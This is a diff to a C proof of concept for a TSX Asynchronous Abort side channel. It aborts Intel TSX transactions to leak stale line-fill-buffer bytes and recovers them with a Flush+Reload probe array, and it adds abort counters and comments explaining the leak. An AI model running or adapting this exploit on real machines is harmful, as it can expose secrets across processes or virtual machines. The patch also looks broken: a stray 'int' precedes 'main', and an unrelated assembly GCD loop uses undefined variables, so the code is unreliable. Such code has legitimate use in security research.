@@ -14,9 +14,10 @@
 char __attribute__((aligned(4096))) mem[256 * 4096];
 char __attribute__((aligned(4096))) mapping[4096];
 size_t hist[256];
-
+volatile long long aborted = 0;
+volatile long long not_aborted = 0;
 void recover(void);
-
+int
 int main(int argc, char *argv[])
 {
   if(!has_tsx()) {
@@ -40,20 +41,72 @@ int main(int argc, char *argv[])
   while (true) {
     /* Flush mapping */
     flush(mapping);
-
+#if 1
     /* Begin transaction and recover value */
     if(xbegin() == (~0u)) {
-      /* Leak a byte speculatively from uncached mapping */
+
+	 /*
+	  * Reference: Intel Deep Dive TSX
+	  * Intel TSX transactions can also be asynchronously aborted,
+	  * such as when a different logical processor writes to a cache
+	  * line that is part of the transaction’s read set, or when the
+	  * transaction exceeds its memory buffering space, or due to
+	  * other microarchitectural reasons.
+	  */
+
+      /*
+       * Transaction abort will happen here
+       * Flush instruction introduce conflicts in cache line due to which transaction is aborted
+       * Due to Transaction abort, stale value from line fill buffer will be leaked
+       */
       char byte = (char) mapping[0];
       
-      /* Use leak byte as a index in probed mem array */
-      /* 4096 is here because probe array has 256 entries 4096 interval apart */
+      /*
+       * Use leak byte as a index in probed mem array
+       * 4096 is here because probe array has 256 entries 4096 interval apart
+       */
       char *p = mem + (byte * 4096);
 
-      /* Access the byte to leave footprint in cache */
+      /*
+       * Access the byte to leave footprint in cache
+       */
       *(volatile char *)p;
+
+      ++ not_aborted;
       xend();
+      ++ aborted;
     }
+#else
+
+//    ; %rdi = leak source
+//    ; %rsi = FLUSH + RELOAD channel
+//    taa_sample:
+//    ; Cause TSX to abort asynchronously.
+//    clflush (%rdi)
+//    clflush (%rsi)
+//
+//    ; Leak a single byte.
+//    xbegin abort
+//    movq (%rdi), %rax
+//    shl $12, %rax
+//    andq $0xff000, %rax
+//    movq (%rax, %rsi), %rax
+//    xend
+//    abort:
+//    retq
+    __asm__ __volatile__ ( "movl %1, %%eax;"
+                          "movl %2, %%ebx;"
+                          "CONTD: cmpl $0, %%ebx;"
+                          "je DONE;"
+                          "xorl %%edx, %%edx;"
+                          "idivl %%ebx;"
+                          "movl %%ebx, %%eax;"
+                          "movl %%edx, %%ebx;"
+                          "jmp CONTD;"
+                          "DONE: movl %%eax, %0;" : "=g" (result) : "g" (a), "g" (b)
+    );
+
+#endif
     
     /* Recover through probe mem array */
     recover();
@@ -73,14 +126,10 @@ void recover(void) {
         update = true;
       }
     }
-
+#if 1
     /* Redraw histogram on update */
     if (update == true) {
-#ifdef _WIN32
-        system("cls");
-#else
         printf("\x1b[2J");
-#endif
 
         int max = 1;
 
@@ -102,7 +151,11 @@ void recover(void) {
 				printf("\n");
 			}
 
+			printf("Aborted Count => %d\n", aborted);
+			printf("Not-Aborted Count => %d\n", not_aborted);
+
 			fflush(stdout);
         }
-    }    
+    }
+#endif
 }
